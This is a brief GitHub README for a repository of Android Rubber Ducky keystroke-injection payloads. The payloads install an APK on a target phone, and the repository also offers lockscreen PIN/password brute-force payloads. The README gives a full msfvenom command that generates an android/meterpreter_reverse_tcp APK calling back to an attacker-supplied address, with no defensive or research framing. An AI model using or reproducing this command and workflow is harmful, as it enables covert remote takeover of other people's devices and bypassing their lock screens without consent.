# ANDROID_BLANKET_PARTY
This repository houses all my Android Rubber Ducky payloads

//BLANKET PArty as in that iconic scene from "FUll MEtal Jacket"//
![image](https://github.com/salvat1on/ANDROID_BLANKET_PARTY/assets/27372029/4ca1e4a8-846d-4da1-b140-8399392bd945)

These payloads will install an apk to the target device that resides in the ducky storage.

The [STAND-ALONE] Pin / Password lockscreen brute force payloads will also be included in 
this Repository.

You can create an APK Payload with metasploit with the following command in the terminal

msfvenom -p android/meterpreter_reverse_tcp LHOST=YOUR_ADDRESS LPORT=5555 -o WHATEVER_NAME.apk

The APK file must then be copied to the ducky along side the bin file you place there as well.
